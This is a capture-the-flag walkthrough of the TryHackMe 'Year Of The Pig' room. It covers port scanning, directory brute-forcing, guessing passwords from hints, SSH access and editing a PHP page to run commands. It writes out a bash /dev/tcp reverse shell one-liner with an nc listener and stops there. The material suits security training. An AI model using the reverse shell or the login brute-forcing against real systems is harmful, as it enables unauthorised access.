# Capture The FLag
[THM] Year Of The Pig Walkthrough

Start with a simple nmap scan:

sudo nmap -sV -A $IP

![Screenshot 2020-10-12 001215](https://user-images.githubusercontent.com/72692401/95679646-fb9fb780-0c1f-11eb-9c54-bb4e65bbe84f.png)


See that there are two opened ports: 
- http:80
- ssh:22

Maybe we have something to do with the http port, so I run gobuster against the website to find hidden directories if exist. Let's have a look at the website, it is about Marco's blog. Because we see that the website is Marco's blog, so marco is a possible username that we should keep in mind!

![homepage](https://user-images.githubusercontent.com/72692401/95679871-571e7500-0c21-11eb-98e5-cf590d279e00.png)

O GET FLAG1.TXT

Recall gobuster, found that there are some other hidden directories but we are interested in the first one !!! (But I think we shouldn't ignore the rest when enumerating, we are better to check all of them).

![gobuster](https://user-images.githubusercontent.com/72692401/95679743-9c8e7280-0c20-11eb-9813-eab78537d097.png)

Let's visit that directory. Hmm, it looks like we need to find credentials to login. I try to login with marco:marco and I failed. However, the website returns us a password hint.

![login](https://user-images.githubusercontent.com/72692401/95680061-82559400-0c22-11eb-8951-143d59d87204.png)

Do you remember marco blog page? He tells us a lot about his hobby which is all about planes and his favorite planes. Therefore, we can list them into the "a memorable word" referred to the password hint.

- A possible memorable word: marco, plane, planes, savoia, macchi, flying.

The password hint also mentioned about there are 2 numbers and a special character at the end of it. Until now, I think that I should try creating a simple python script to bruteforce login credentials. (I had included the script in github page site as well, for saving your time, I had removed some invalid combinations) (I'm really sorry because the script is not well-organized and bad).

![login](https://user-images.githubusercontent.com/72692401/95680440-7f0fd780-0c25-11eb-9eaf-1225623b50f7.png)

Successfully login, I immediately click onto "COMMANDS" page without any thinking and checking other pages !!!. 

I try different commands and also try escaping command filtering but it keeps returning "Invalid Command!". This could be a trap!

However, you remember that we have another port is opening, which is 22:ssh, I successfully login with the credentials that we found previously and read "flag1.txt"

![login](https://user-images.githubusercontent.com/72692401/95681024-525dbf00-0c29-11eb-8ccf-6f4390291964.png)

o GET FLAG2.TXT

Listing home directory, there is another user is curtis, maybe I have to find a way to compromise this user.
I tried to enumerate more about the current user and found that he belongs to "web-developers" group. The ability of this group is reading and writing files in "/var/www/html/admin/*".

In "/var/www/", I see a file called admin.db and I also realize that website using "sqlite3" to access to that database, which could possibly contain curtis's credentials.

Running "sqlite3 admin.db" returns "a permission denied" because the file is only readable and writable by "www-data". The attack vector is very straightfoward, we need to modify "commands.php" located in "/var/www/html/admin/commands.php" and get a reverse shell as "www-data".

All we need to do is changing line 52 as followed, we can run any commands that we want to.

![invalid](https://user-images.githubusercontent.com/72692401/95681747-52f85480-0c2d-11eb-8ab2-ca7410a68810.png)

Comeback to admin site -> commands -> running: bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1' and establish nc listening, we should a reverse shell !
















